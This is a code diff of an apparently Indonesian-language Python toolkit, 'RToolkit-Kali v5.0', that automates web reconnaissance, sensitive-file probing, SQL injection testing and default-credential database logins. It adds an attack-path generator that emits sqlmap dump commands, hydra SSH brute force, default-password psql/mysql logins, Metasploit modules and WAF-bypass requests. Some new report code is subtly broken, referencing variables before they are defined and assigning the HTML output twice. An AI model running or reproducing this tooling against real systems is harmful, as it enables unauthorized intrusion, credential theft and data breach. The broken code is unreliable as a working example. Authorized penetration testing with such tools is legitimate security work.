+        print(f"    {c('Teknologi:',DIM)} {len(REPORT['technologies'])} teridentifikasi")
 
+    print_phase_done("Phase 1d — Live Host", {
+        "URL aktif": len(live_urls),
+        "Teknologi": len(REPORT['technologies'])
+    })
     return list(live_urls)
 
 # ====== CONCURRENT EXECUTION ======
@@ -1462,7 +1918,13 @@ def phase2_discovery(live_urls, tools):
                 except requests.RequestException:
                     pass
             with concurrent.futures.ThreadPoolExecutor(max_workers=cfg("threads", 100)) as ex:
-                ex.map(check_path, dirs_wordlist)
+                futs = [ex.submit(check_path, p) for p in dirs_wordlist]
+                done = 0
+                for f in concurrent.futures.as_completed(futs):
+                    done += 1
+                    if done % 25 == 0:
+                        print(f"    {c(f'Direktori: {done}/{len(dirs_wordlist)}',DIM)}", end='\r')
+                print(f"    {c(f'Direktori: {done}/{len(dirs_wordlist)} selesai',DIM)}")
 
         # ParamSpider
         if tools.get("paramspider"):
@@ -1487,6 +1949,18 @@ def phase2_discovery(live_urls, tools):
 
     dir_table = [[str(len(REPORT["directories"])), str(len(REPORT["parameters"]))]]
     print_table(["Directories","Parameters"], dir_table, "[DISCOVERY SUMMARY]")
+    if not REPORT["directories"] and not REPORT["parameters"]:
+        print(f"  {c('ℹ️  Tidak ada direktori atau parameter yang ditemukan',Y)}")
+        print(f"  {c('  ⤷ Target mungkin memiliki akses kontrol ketat atau struktur URL minimal',DIM)}")
+
+    print_phase_done("Phase 2 — Discovery", {
+        "Direktori": len(REPORT["directories"]),
+        "Parameter": len(REPORT["parameters"])
+    })
+
+    sensitive_urls = [d["url"] for d in REPORT["directories"] if any(p in d["url"] for p in ["env","git","config","sql","dump","backup","wp-config","phpinfo","admin"])]
+    if sensitive_urls:
+        print_critical_box("FILE SENSITIF DITEMUKAN — Segera laporkan!", sensitive_urls[:10])
 
 # ====== PHASE 3: VULNERABILITY SCAN ======
 SENSITIVE_PATHS = [
@@ -1561,7 +2035,7 @@ def phase3_vuln_scan(live_urls, tools):
 
         # 3c. Sensitive file exposure
         print(f"  {c('[3c] File sensitif — Mengecek file penting yang terekspos',G)}")
-        print(f"  {c('  ⤷ .env, .git/config, wp-config.php, backup, dll — 60+ path',DIM)}")
+        print(f"  {c('  ⤷ .env, .git/config, wp-config.php, backup, dll — {len(SENSITIVE_PATHS)}+ path',DIM)}")
         if HAS_REQUESTS:
             def check_sensitive(path):
                 try:
@@ -1590,7 +2064,13 @@ def phase3_vuln_scan(live_urls, tools):
                 except requests.RequestException:
                     pass
             with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
-                ex.map(check_sensitive, SENSITIVE_PATHS)
+                futs = [ex.submit(check_sensitive, p) for p in SENSITIVE_PATHS]
+                done = 0
+                for f in concurrent.futures.as_completed(futs):
+                    done += 1
+                    if done % 10 == 0:
+                        print(f"    {c(f'File: {done}/{len(SENSITIVE_PATHS)}',DIM)}", end='\r')
+                print(f"    {c(f'File: {done}/{len(SENSITIVE_PATHS)} selesai',DIM)}")
 
         # 3d. SQL injection detection (quick check)
         print(f"  {c('[3d] SQL Injection — Deteksi celah SQL injection',G)}")
@@ -1604,8 +2084,13 @@ def phase3_vuln_scan(live_urls, tools):
         if HAS_REQUESTS:
             params = ["id","page","q","s","search","cat","file","load","action",
                       "exec","cmd","order","sort","limit","offset","dir"]
+            total_checks = len(params) * len(sqli_payloads)
+            check_count = 0
             for param in params:
                 for payload in sqli_payloads:
+                    check_count += 1
+                    if check_count % 5 == 0:
+                        print(f"    {c('SQLi:',DIM)} {check_count}/{total_checks}", end='\r')
                     try:
                         if '?' in url:
                             test_url = re.sub(f'({re.escape(param)}=)[^&]*',
@@ -1657,6 +2142,23 @@ def phase3_vuln_scan(live_urls, tools):
     if vuln_table:
         print_table(["Name","Sev","URL","Source"], vuln_table[:30],
                    f"[VULNS FOUND ({len(REPORT['vulnerabilities'])} total)]")
+    else:
+        print(f"\n  {c('✅ Tidak ada kerentanan terdeteksi',G)}")
+        print(f"  {c('  ⤷ Bisa berarti: target sudah diamankan, atau perlu scan lebih dalam',DIM)}")
+
+    # Count by severity
+    sev_counts = {}
+    for v in REPORT["vulnerabilities"]:
+        s = v.get("severity", "INFO").upper()
+        sev_counts[s] = sev_counts.get(s, 0) + 1
+    print_phase_done("Phase 3 — Vuln Scan", sev_counts)
+
+    # Highlight critical findings
+    critical_vulns = [v for v in REPORT["vulnerabilities"] if v.get("severity", "").upper() == "CRITICAL"]
+    if critical_vulns:
+        print_critical_box("KERENTANAN KRITIS — Investigasi segera!", [
+            f"{v['name'][:50]} @ {v.get('url','')[:40]}" for v in critical_vulns[:10]
+        ])
 
 # ====== PHASE 4: DATABASE EXPLOITATION ======
 @timer
@@ -1678,7 +2180,8 @@ def phase4_db(domain):
                 db_services.append({"protocol":"mssql","port":1433})
 
     if not db_services:
-        print(f"  {c('No database services detected',G)}")
+        print(f"  {c('ℹ️  Tidak ada port database terbuka (PostgreSQL:5432, MySQL:3306, MSSQL:1433)',Y)}")
+        print(f"  {c('  ⤷ Database tidak terekspos ke publik — aman dari serangan eksternal',DIM)}")
         return
 
     for svc in db_services:
@@ -1730,6 +2233,158 @@ def phase4_db(domain):
                         "severity":"CRITICAL","source":"db_check",
                         "exploit_cmd":f"mysql -h {domain} -u {user} -p'{pwd}' -e 'SELECT schema_name FROM information_schema.schemata;'"})
 
+    db_vulns = [v for v in REPORT["vulnerabilities"] if v["source"] == "db_check"]
+    if db_vulns:
+        print_phase_done("Phase 4 — Database", {"Creds ditemukan": len(db_vulns)})
+    else:
+        print(f"\n  {c('ℹ️  Database services ditemukan tapi tidak ada creds default yang cocok',Y)}")
+        print(f"  {c('  ⤷ Coba dengan wordlist yang lebih besar (hydra / john)',DIM)}")
+
+# ====== ATTACK PATH GENERATOR (v5.0) ======
+def generate_attack_paths(report_data):
+    """
+    Chaining analysis: connects findings into actionable attack paths.
+    Each path has: name, steps (list of evidence), likelihood, impact, commands.
+    """
+    paths = []
+    svcs = report_data.get("services", [])
+    cves = report_data.get("cves", [])
+    vulns = report_data.get("vulnerabilities", [])
+    ports = report_data.get("ports", [])
+    subdomains = report_data.get("subdomains", [])
+    dirs = report_data.get("directories", [])
+    params = report_data.get("parameters", [])
+    techs = report_data.get("technologies", [])
+    sqli_vulns = [v for v in vulns if "sqli" in v.get("name","").lower() or "sql injection" in v.get("name","").lower()]
+
+    # Helper: check if any CVE matches a keyword and has real exploit
+    def has_cve_with_exploit(keyword):
+        for c in cves:
+            if keyword in c.get("software","").lower() and c.get("exploit_available"):
+                return True
+        return False
+
+    def has_cve_any(keyword):
+        return any(keyword in c.get("software","").lower() for c in cves)
+
+    # 1. Web Entry → RCE
+    web_cves = [c for c in cves if any(w in c.get("cve","").lower() for w in ["rce","remote code","code exec","shell"])]
+    if web_cves:
+        steps = [f"Web server exposed (HTTP/HTTPS)", f"CVE: {web_cves[0]['cve']}"]
+        if has_cve_with_exploit("apache"):
+            steps.append("Public exploit available")
+        paths.append({
+            "name": "Web Entry → Remote Code Execution",
+            "steps": steps,
+            "likelihood": "HIGH" if any(c.get("exploit_available") for c in web_cves) else "MEDIUM",
+            "impact": "CRITICAL",
+            "commands": [f"# RCE via {web_cves[0]['cve']}",
+                        f"# Check: searchsploit --cve {web_cves[0]['cve']}",
+                        f"curl -s 'http://{report_data.get('target','target')}/' -H 'Host: localhost'"]
+        })
+
+    # 2. SQL Injection → Data Exfiltration
+    if sqli_vulns:
+        paths.append({
+            "name": "SQL Injection → Database Extraction",
+            "steps": [f"{len(sqli_vulns)} SQLi point(s) found",
+                     f"Affected params: {', '.join(v.get('param','?') for v in sqli_vulns[:3])}",
+                     "Potential data: users, passwords, PII"],
+            "likelihood": "HIGH" if len(sqli_vulns) > 1 else "MEDIUM",
+            "impact": "CRITICAL",
+            "commands": [f"sqlmap -u 'http://{report_data.get('target','target')}/' --batch --dbs",
+                        f"sqlmap -u 'http://{report_data.get('target','target')}/' --batch --tables -D <database>",
+                        f"# Or manual: ' OR 1=1 -- -, ' UNION SELECT ..."]
+        })
+
+    # 3. Database Direct Access
+    db_ports = [p for p in ports if any(q in p for q in ["5432","3306","1433"])]
+    db_vulns = [v for v in vulns if "database" in v.get("url","").lower() or "postgres" in v.get("name","").lower() or "mysql" in v.get("name","").lower()]
+    if db_ports or db_vulns:
+        steps = ["Database port(s) publicly exposed: "+", ".join(p for p in db_ports[:3])] if db_ports else []
+        if db_vulns:
+            steps.append("Default credentials found - direct access possible")
+        paths.append({
+            "name": "Database Direct → Data Breach",
+            "steps": steps,
+            "likelihood": "HIGH" if db_vulns else "MEDIUM",
+            "impact": "CRITICAL",
+            "commands": [
+                f"PGPASSWORD='postgres' psql -h {report_data.get('target','target')} -U postgres -d postgres",
+                f"mysql -h {report_data.get('target','target')} -u root -p"
+            ]
+        })
+
+    # 4. Sensitive File Exposure
+    exposed_files = [d for d in dirs if any(p in d.get("url","").lower() for p in [".env ",".git","config","sql","dump","backup","wp-config","phpinfo","admin"])]
+    if exposed_files:
+        paths.append({
+            "name": "Sensitive File Exposure → Credential Leak",
+            "steps": [f"{len(exposed_files)} sensitive file(s) exposed: " + ", ".join(d["url"].split("/")[-1] for d in exposed_files[:5]),
+                     "Potential contents: credentials, API keys, source code"],
+            "likelihood": "HIGH",
+            "impact": "HIGH",
+            "commands": ["curl -s '" + d["url"] + "'" for d in exposed_files[:3]]
+        })
+
+    # 5. SSH Bruteforce
+    if any("22" in p for p in ports):
+        ssh_cve = any("openssh" in c.get("software","").lower() for c in cves)
+        paths.append({
+            "name": "SSH Bruteforce / Remote Access",
+            "steps": ["SSH (22) publicly exposed",
+                     "Potential: password bruteforce, key-based auth" +
+                     (" + Known CVE" if ssh_cve else "")],
+            "likelihood": "MEDIUM" if ssh_cve else "LOW",
+            "impact": "CRITICAL",
+            "commands": [
+                f"hydra -l root -P /usr/share/wordlists/rockyou.txt {report_data.get('target','target')} ssh",
+                f"# Check for weak keys: ssh -o StrictHostKeyChecking=no root@{report_data.get('target','target')}"
+            ]
+        })
+
+    # 6. WAF Bypass → Access Restricted Resources
+    waf_bypasses = [v for v in vulns if "waf bypass" in v.get("name","").lower()]
+    if waf_bypasses:
+        paths.append({
+            "name": "WAF Bypass → Restricted Resource Access",
+            "steps": [f"{len(waf_bypasses)} WAF bypass(es) successful",
+                     "Access sensitive files behind WAF"],
+            "likelihood": "HIGH",
+            "impact": "HIGH",
+            "commands": [f"# Bypass technique: {waf_bypasses[0].get('name','')}",
+                        f"curl -s '{waf_bypasses[0].get('url','')}' -H 'X-Forwarded-For: 127.0.0.1'"]
+        })
+
+    # 7. WordPress-Specific Chain
+    wp_techs = [t for t in techs if "wordpress" in t.lower()]
+    wp_plugins_cves = [c for c in cves if "plugin" in c.get("software","").lower()]
+    if wp_techs or wp_plugins_cves:
+        steps = ["WordPress detected"]
+        if wp_plugins_cves:
+            steps.append(f"{len(wp_plugins_cves)} plugin CVE(s) identified (THEORETICAL)")
+        paths.append({
+            "name": "WordPress Multi-Stage Attack",
+            "steps": steps,
+            "likelihood": "MEDIUM",
+            "impact": "HIGH",
+            "commands": [
+                f"wpscan --url http://{report_data.get('target','target')}/ --enumerate vp,vt,tt",
+                f"# Enable XML-RPC: POST http://{report_data.get('target','target')}/xmlrpc.php",
+                f"# Bruteforce: wpscan --url http://{report_data.get('target','target')}/ --passwords rockyou.txt"
+            ]
+        })
+
+    # Score each path
+    for path in paths:
+        likelihood_score = {"HIGH": 3, "MEDIUM": 2, "LOW": 1}.get(path["likelihood"], 1)
+        impact_score = {"CRITICAL": 3, "HIGH": 2, "MEDIUM": 1}.get(path["impact"], 1)
+        path["priority_score"] = likelihood_score * impact_score
+
+    # Sort by priority
+    paths.sort(key=lambda p: p["priority_score"], reverse=True)
+    return paths
+
 # ====== PHASE 5: EXPLOITATION ENGINE ======
 @timer
 def phase5_exploit(domain):
@@ -1759,9 +2414,9 @@ def phase5_exploit(domain):
         else:
             print(f"    {c(name+':',C)} {cmd[:70]}...")
 
-    # Exploit dari CVE
+    # Exploit dari CVE (v5.0: dynamic + searchsploit)
     if REPORT["cves"]:
-        print(f"\n  {c('[Exploit Commands dari CVEs:]',R)}")
+        print(f"\n  {c('[+] Exploit Commands dari CVEs:',R)}")
         seen = set()
         exploit_map = {
             "apache": ["msfconsole -q -x 'use exploit/multi/http/apache_mod_proxy_rce; set RHOSTS "+domain+"; run'"],
@@ -1771,12 +2426,40 @@ def phase5_exploit(domain):
         }
         for cv in REPORT["cves"]:
             sw = cv["software"].lower()
+            # Show dynamic exploit commands from searchsploit results
+            if cv.get("exploit_available") and cv.get("exploit_edb_id"):
+                cmd_key = f"searchsploit -m {cv['exploit_edb_id']}"
+                if cmd_key not in seen:
+                    seen.add(cmd_key)
+                    print(f"    {c('➜',M)} searchsploit -m {cv['exploit_edb_id']}  ({cv['cve'][:40]})")
+                    print(f"      {c(cv.get('exploit_title','')[:80],DIM)}")
+            # Also try the static exploit_map
             for key, cmds in exploit_map.items():
                 if key in sw:
                     for cmd in cmds:
                         if cmd not in seen:
                             seen.add(cmd)
                             print(f"    {c('➜',M)} {cmd}  ({cv['cve'][:40]})")
+
+    # v5.0: Attack Paths
+    if cfg("enable_attack_paths", True):
+        paths = generate_attack_paths(REPORT)
+        if paths:
+            REPORT["attack_paths"] = paths
+            print(f"\n  {c('[+] Attack Paths — Jalur Serangan Prioritas',R)}")
+            print(f"  {c('  ⤷ Berdasarkan chaining semua temuan: port + CVE + vuln + exploit',DIM)}")
+            for i, path in enumerate(paths[:5], 1):
+                priority_label = c("🔴 PRIORITAS",R) if path["priority_score"] >= 6 else c("🟡 LIHAT",Y) if path["priority_score"] >= 3 else c("🟢 CATAT",G)
+                print(f"\n  {c(f'{i}. [{priority_label}]',BOLD)} {c(path[\"name\"],W)}")
+                print(f"     {c('Likelihood:',C)} {c(path[\"likelihood\"],G if path[\"likelihood\"]==\"HIGH\" else Y)}  "
+                      f"{c('Impact:',C)} {c(path[\"impact\"],R if path[\"impact\"]==\"CRITICAL\" else Y)}  "
+                      f"{c('Score:',C)} {path['priority_score']}")
+                for step in path["steps"][:4]:
+                    print(f"     {c('▸',DIM)} {step}")
+                for cmd in path["commands"][:2]:
+                    print(f"     {c('$',M)} {c(cmd[:80],DIM)}")
+            if len(paths) > 5:
+                print(f"  ... +{len(paths)-5} more attack paths (see report)")
 
     # Privesc
     print(f"\n  {c('[+] Linux Privesc Commands',G)}")
@@ -1811,26 +2494,40 @@ def phase6_report(domain):
     s = REPORT["summary"]
     total_time = int(sum(phase_times.values()))
 
+    # v5.0: Count CVEs by source and confidence
+    conf_src = REPORT.get("cve_confidence", {"confirmed":0,"suspected":0,"theoretical":0})
+    cve_srcs = REPORT.get("cve_sources", {"local_db":0,"nvd_api":0,"hardcoded":0})
     print(f"""
-  {c('╔════════════════════════════════════════════════════╗',Y)}
-  {c('║',Y)}  {c('FINAL SCAN SUMMARY',BOLD)}                             {c('║',Y)}
-  {c('╠════════════════════════════════════════════════════╣',Y)}
-  {c('║',Y)}  Target:   {c(domain,W)}                   {c('║',Y)}
-  {c('║',Y)}  CVEs:     {c(str(len(REPORT['cves'])),W)}                        {c('║',Y)}
-  {c('║',Y)}  Vulns:    {c(str(s['total']),W)}                        {c('║',Y)}
-  {c('║',Y)}  Critical: {c(str(s['critical']),R)}                          {c('║',Y)}
-  {c('║',Y)}  High:     {c(str(s['high']),R)}                          {c('║',Y)}
-  {c('║',Y)}  Medium:   {c(str(s['medium']),Y)}                          {c('║',Y)}
-  {c('║',Y)}  Subdomains: {c(str(len(REPORT['subdomains'])),W)}                    {c('║',Y)}
-  {c('║',Y)}  Total time: {c(str(total_time)+'s',W)}                      {c('║',Y)}
-  {c('╚════════════════════════════════════════════════════╝',Y)}""")
+  {c('╔═══════════════════════════════════════════════════════════╗',Y)}
+  {c('║',Y)}        {c('📊 LAPORAN AKHIR — '+domain.upper()+' (v5.0)',BOLD)}           {c('║',Y)}
+  {c('╠═══════════════════════════════════════════════════════════╣',Y)}
+  {c('║',Y)}  {c('CVEs:',C)}    {c(str(len(REPORT['cves'])).rjust(6),W)}  {c('Vulns:',C)} {c(str(s['total']).rjust(5),W)}  {c('Exploit:',C)} {c(str(REPORT.get('exploit_available_count',0)).rjust(4),R)}  {c('Paths:',C)} {c(str(len(REPORT.get('attack_paths',[]))).rjust(4),W)}   {c('║',Y)}
+  {c('║',Y)}  {c('Critical:',C)} {c(str(s['critical']).rjust(4),R)}  {c('High:',C)} {c(str(s['high']).rjust(4),R)}  {c('Medium:',C)} {c(str(s['medium']).rjust(4),Y)}  {c('Time:',C)} {c(str(total_time)+'s',W).rjust(6)} {c('║',Y)}
+  {c('╠═══════════════════════════════════════════════════════════╣',Y)}
+  {c('║',Y)}  {c('[v5.0] Confidence:',C)}                                           {c('║',Y)}
+  {c('║',Y)}  {c('CONFIRMED:',C)} {c(str(conf_src.get('confirmed',0)).rjust(3),G)}  {c('SUSPECTED:',C)} {c(str(conf_src.get('suspected',0)).rjust(3),Y)}  {c('THEORETICAL:',C)} {c(str(conf_src.get('theoretical',0)).rjust(3),R)}   {c('║',Y)}
+  {c('║',Y)}  {c('[v5.0] Sources:',C)} {c(str(cve_srcs.get('local_db',0)).rjust(3),W)} local  {c(str(cve_srcs.get('nvd_api',0)).rjust(3),C)} NVD  {c(str(cve_srcs.get('hardcoded',0)).rjust(3),R)} hardcoded {c('║',Y)}
+  {c('╠═══════════════════════════════════════════════════════════╣',Y)}
+  {c('║',Y)}  {c('-> Prioritas: perbaiki CRITICAL & HIGH dulu!',BOLD)}             {c('║',Y)}""")
+    if s['critical'] > 0:
+        risk = "🔴 KRITIS — Segera tindak!"
+    elif s['high'] > 0:
+        risk = "🟠 TINGGI — Prioritaskan!"
+    elif s['medium'] > 0:
+        risk = "🟡 SEDANG — Jadwalkan perbaikan"
+    else:
+        risk = "🟢 RENDAH — Terus pantau"
+    print(f"  {c('║',Y)}  {c(risk.ljust(53),BOLD)} {c('║',Y)}")
+    print(f"  {c('╚═══════════════════════════════════════════════════════════╝',Y)}")
 
     # HTML Report
     ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
     cve_rows = "".join(
         f'<tr><td>{cv["port"]}</td><td>{cv["software"]}</td><td>{cv["version"]}</td>'
         f'<td class="sev-{cv["severity"]}">{cv["cve"]}</td>'
-        f'<td class="sev-{cv["severity"]}">{cv["severity"]}</td></tr>'
+        f'<td class="sev-{cv["severity"]}">{cv["severity"]}</td>'
+        f'<td class="conf-{cv.get("confidence","SUSPECTED")}">{cv.get("confidence","?")}</td>'
+        f'<td class="{"exploit-yes" if cv.get("exploit_available") else "exploit-no"}">{"EXPLOIT: "+str(cv.get("exploit_edb_id","")) if cv.get("exploit_available") else "---"}</td></tr>'
         for cv in REPORT["cves"][:100])
     vuln_rows = "".join(
         f'<tr><td>{v["name"][:60]}</td>'
@@ -1843,11 +2540,67 @@ def phase6_report(domain):
         f'<td class="sev-{v.get("severity","INFO")}">{v.get("severity","INFO")}</td>'
         f'<td>{v.get("url","")[:60]}</td><td>{v.get("source","")}</td></tr>'
         for v in REPORT["vulnerabilities"] if "sqli" in v.get("name","").lower() or "sql" in v.get("name","").lower())
-    recs = generate_remediation()
+    conf_src = REPORT.get("cve_confidence", {"confirmed":0,"suspected":0,"theoretical":0})
+    cve_srcs = REPORT.get("cve_sources", {"local_db":0,"nvd_api":0,"hardcoded":0})
+    paths = REPORT.get("attack_paths", [])
+    recs = generate_remediation_v5(conf_src)
+    rec_rows = "".join(f'<li>{r}</li>' for r in recs)
+
+    html = f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>RToolkit v5.0 Report - {domain}</title>
+<style>
+*{{margin:0;padding:0;box-sizing:border-box}} body{{font-family:'Segoe UI',sans-serif;background:#0d1117;color:#c9d1d9;padding:20px}}
+.container{{max-width:1200px;margin:0 auto}} .header{{background:linear-gradient(135deg,#161b22,#1c2128);border:1px solid #30363d;border-radius:8px;padding:30px;margin-bottom:24px;text-align:center}}
+.header h1{{color:#ff6b6b;font-size:28px}} .header .target{{color:#58a6ff;font-size:18px}}
+.stats{{display:grid;grid-template-columns:repeat(8,1fr);gap:12px;margin-bottom:24px}}
+.stat-box{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;text-align:center}}
+.stat-box .num{{font-size:28px;font-weight:bold}} .stat-box .label{{font-size:12px;color:#8b949e}}
+.section{{background:#161b22;border:1px solid #30363d;border-radius:8px;margin-bottom:20px}}
+.section h2{{background:#1c2128;padding:12px 20px;font-size:16px;border-bottom:1px solid #30363d;color:#58a6ff}}
+.section-content{{padding:16px 20px}} table{{width:100%;border-collapse:collapse}}
+th{{text-align:left;padding:8px 12px;font-size:12px;text-transform:uppercase;color:#8b949e;border-bottom:1px solid #30363d}}
+td{{padding:8px 12px;border-bottom:1px solid #21262d;font-size:13px}}
+tr:hover{{background:#1c2128}} .sev-CRITICAL{{color:#ff6b6b;font-weight:bold}} .sev-HIGH{{color:#ff6b6b;font-weight:bold}}
+.sev-MEDIUM{{color:#d29922;font-weight:bold}} .sev-LOW{{color:#58a6ff}}
+.conf-CONFIRMED{{color:#3fb950;font-weight:bold}} .conf-SUSPECTED{{color:#d29922;font-weight:bold}} .conf-THEORETICAL{{color:#f85149}}
+.exploit-yes{{color:#f85149;font-weight:bold}} .exploit-no{{color:#8b949e}} .path-HIGH{{color:#f85149}} .path-MEDIUM{{color:#d29922}} .path-LOW{{color:#58a6ff}}
+.path-box{{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px 16px;margin-bottom:12px}}
+.path-title{{color:#ff6b6b;font-weight:bold;margin-bottom:6px}} .path-meta{{color:#8b949e;font-size:12px;margin-bottom:4px}}
+</style></head><body><div class="container">
+<div class="header"><h1>RToolkit-Kali v5.0 Report</h1><div class="target">{domain}</div><div style="color:#8b949e;font-size:14px">Generated: {REPORT["timestamp"]}</div></div>
+<div class="stats">
+<div class="stat-box"><div class="num" style="color:#ff6b6b">{s["critical"]}</div><div class="label">Critical</div></div>
+<div class="stat-box"><div class="num" style="color:#ff6b6b">{s["high"]}</div><div class="label">High</div></div>
+<div class="stat-box"><div class="num" style="color:#d29922">{s["medium"]}</div><div class="label">Medium</div></div>
+<div class="stat-box"><div class="num" style="color:#58a6ff">{s["low"]}</div><div class="label">Low</div></div>
+<div class="stat-box"><div class="num" style="color:#8b949e">{s["total"]}</div><div class="label">Total Vulns</div></div>
+<div class="stat-box"><div class="num" style="color:#f85149">{REPORT.get("exploit_available_count",0)}</div><div class="label">Exploits</div></div>
+<div class="stat-box"><div class="num" style="color:#3fb950">{conf_src.get("confirmed",0)}</div><div class="label">Confirmed</div></div>
+<div class="stat-box"><div class="num" style="color:#58a6ff">{total_time}s</div><div class="label">Duration</div></div>
+</div>
+<div class="section"><h2>Confidence Breakdown</h2><div class="section-content">
+<span class="conf-CONFIRMED">{conf_src.get('confirmed',0)} CONFIRMED</span> |
+<span class="conf-SUSPECTED">{conf_src.get('suspected',0)} SUSPECTED</span> |
+<span class="conf-THEORETICAL">{conf_src.get('theoretical',0)} THEORETICAL</span> (plugin CVEs without version verification)<br>
+<span style="color:#8b949e">Sources: {cve_srcs.get('local_db',0)} local_db | {cve_srcs.get('nvd_api',0)} nvd_api | {cve_srcs.get('hardcoded',0)} hardcoded</span>
+</div></div>
+<div class="section"><h2>Subdomains ({len(REPORT["subdomains"])})</h2><div class="section-content"><table><tr><th>Subdomain</th></tr>{sub_rows}</table></div></div>
+<div class="section"><h2>CVEs ({len(REPORT["cves"])})</h2><div class="section-content"><table><tr><th>Port</th><th>Software</th><th>Version</th><th>CVE</th><th>Severity</th><th>Confidence</th><th>Exploit</th></tr>{cve_rows}</table></div></div>
+<div class="section"><h2>SQL Injection ({sqli_count})</h2><div class="section-content">{'<table><tr><th>Name</th><th>Severity</th><th>URL</th><th>Source</th></tr>'+sqli_rows+'</table>' if sqli_rows else '<p style="color:#8b949e">None detected</p>'}</div></div>
+<div class="section"><h2>Attack Paths ({len(paths)})</h2><div class="section-content">
+{'<div class="path-box"><div class="path-title">'+'<br>'.join([
+f"<b>{p['name']}</b> [<span class='path-{p['likelihood']}'>{p['likelihood']}</span>/<span class='path-{p['impact']}'>{p['impact']}</span> score={p.get('priority_score',0)}]<br>"+
+"<br>".join(f"  - {s}" for s in p["steps"])+
+"<br><code>"+"</code><br><code>".join(p["commands"][:2])+"</code>"
+for p in paths[:7]
+])+'</div></div>' if paths else '<p style="color:#8b949e">No attack paths identified. Low finding count or all findings are theoretical.</p>'}
+</div></div>
+<div class="section"><h2>Vulnerabilities ({len(REPORT["vulnerabilities"])})</h2><div class="section-content"><table><tr><th>Name</th><th>Severity</th><th>URL</th><th>Source</th></tr>{vuln_rows}</table></div></div>
+<div class="section"><h2>Remediation Recommendations</h2><div class="section-content"><ul style="padding-left:20px;line-height:1.8">{rec_rows}</ul></div></div>
+</div></body></html>"""
     rec_rows = "".join(f'<li>{r}</li>' for r in recs)
     sub_rows = "".join(f'<tr><td>{s}</td></tr>' for s in REPORT["subdomains"][:50])
 
-    html = f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>RToolkit v4.0 Report - {domain}</title>
+    html = f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>RToolkit v5.0 Report - {domain}</title>
 <style>
 *{{margin:0;padding:0;box-sizing:border-box}} body{{font-family:'Segoe UI',sans-serif;background:#0d1117;color:#c9d1d9;padding:20px}}
 .container{{max-width:1200px;margin:0 auto}} .header{{background:linear-gradient(135deg,#161b22,#1c2128);border:1px solid #30363d;border-radius:8px;padding:30px;margin-bottom:24px;text-align:center}}
@@ -1863,7 +2616,7 @@ td{{padding:8px 12px;border-bottom:1px solid #21262d;font-size:13px}}
 tr:hover{{background:#1c2128}} .sev-CRITICAL{{color:#ff6b6b;font-weight:bold}} .sev-HIGH{{color:#ff6b6b;font-weight:bold}}
 .sev-MEDIUM{{color:#d29922;font-weight:bold}} .sev-LOW{{color:#58a6ff}}
 </style></head><body><div class="container">
-<div class="header"><h1>RToolkit-Kali v4.0 Report</h1><div class="target">{domain}</div><div style="color:#8b949e;font-size:14px">Generated: {REPORT["timestamp"]}</div></div>
+<div class="header"><h1>RToolkit-Kali v5.0 Report</h1><div class="target">{domain}</div><div style="color:#8b949e;font-size:14px">Generated: {REPORT["timestamp"]}</div></div>
 <div class="stats">
 <div class="stat-box"><div class="num" style="color:#ff6b6b">{s["critical"]}</div><div class="label">Critical</div></div>
 <div class="stat-box"><div class="num" style="color:#ff6b6b">{s["high"]}</div><div class="label">High</div></div>
@@ -1932,22 +2685,32 @@ def phase1c_tech_deep(domain, live_urls):
             if tech_table:
                 print_table(["Technology","Version/Detail"], tech_table, "[TECH]")
                 REPORT["technologies"].extend([f"{k}: {v}" for k,v in version_keys.items()])
-            # Enhanced CVE matching
+            # Enhanced CVE matching (v5: semver + confidence)
             cves = match_cves_enhanced(techs)
             if cves:
+                CONF_COLORS2 = {"CONFIRMED": G, "SUSPECTED": Y, "THEORETICAL": R}
                 cve_table = []
                 for cv in cves:
                     sev = cv.get("severity","HIGH")
+                    conf = cv.get("confidence","?")
                     cve_table.append([cv["software"], cv["version"],
-                        c(cv["cve"],R if sev in ["CRITICAL","HIGH"] else Y), sev])
-                print_table(["Software","Version","CVE","Severity"], cve_table, "[CVES]")
+                        c(cv["cve"],R if sev in ["CRITICAL","HIGH"] else Y),
+                        sev, c(conf[:10], CONF_COLORS2.get(conf, DIM))])
+                print_table(["Software","Version","CVE","Sev","Conf"], cve_table, "[CVES]")
                 for cv in cves:
                     sev = cv.get("severity","HIGH").lower()
+                    conf = cv.get("confidence","SUSPECTED")
+                    src = cv.get("source","local_db")
+                    vmt = cv.get("version_match_type","exact")
                     if not any(c.get('cve')==cv['cve'] for c in REPORT["cves"]):
-                        REPORT["cves"].append({"port":80,"service":"http","software":cv["software"],
-                            "version":cv["version"],"cve":cv["cve"],"severity":cv.get("severity","HIGH")})
+                        entry = {"port":80,"service":"http","software":cv["software"],
+                            "version":cv["version"],"cve":cv["cve"],"severity":cv.get("severity","HIGH"),
+                            "confidence":conf,"source":src,"version_match_type":vmt}
+                        REPORT["cves"].append(entry)
                         REPORT["summary"][sev] = REPORT["summary"].get(sev,0)+1
                         REPORT["summary"]["total"] += 1
+                        REPORT["cve_sources"][src] = REPORT["cve_sources"].get(src,0)+1
+                        REPORT["cve_confidence"][conf.lower()] = REPORT["cve_confidence"].get(conf.lower(),0)+1
             # WP Plugins/Themes
             if "WP_Plugins" in techs:
                 plug_table = [[p, "Unknown"] for p in techs["WP_Plugins"]]
@@ -2100,11 +2863,69 @@ def generate_remediation():
         recs.add(f"Address {len(REPORT['cves'])} matched CVEs by updating affected software")
     return list(recs)[:12]
 
+# v5.0: Confidence-aware remediation
+def generate_remediation_v5(conf_src=None):
+    """Generate prioritized recommendations. CONFIRMED CVEs get highest priority."""
+    recs = []
+    cves = REPORT.get("cves", [])
+    conf_src = conf_src or REPORT.get("cve_confidence", {})
+
+    # Priority 1: Exploit-available CVEs (highest risk)
+    exploit_cves = [c for c in cves if c.get("exploit_available")]
+    if exploit_cves:
+        recs.append(f"[URGENT] {len(exploit_cves)} CVE(s) have PUBLIC EXPLOITS available: "
+                    + ", ".join(c.get("cve","") for c in exploit_cves[:3])
+                    + ". Patch immediately or apply compensating controls.")
+
+    # Priority 2: CONFIRMED CVEs
+    confirmed = [c for c in cves if c.get("confidence") == "CONFIRMED"]
+    if confirmed:
+        recs.append(f"[HIGH] {len(confirmed)} CONFIRMED CVE(s) match target software versions: "
+                    + ", ".join(c.get("cve","") for c in confirmed[:3])
+                    + ". Verify and patch these first.")
+
+    # Priority 3: THEORETICAL plugin CVEs (needs manual verification)
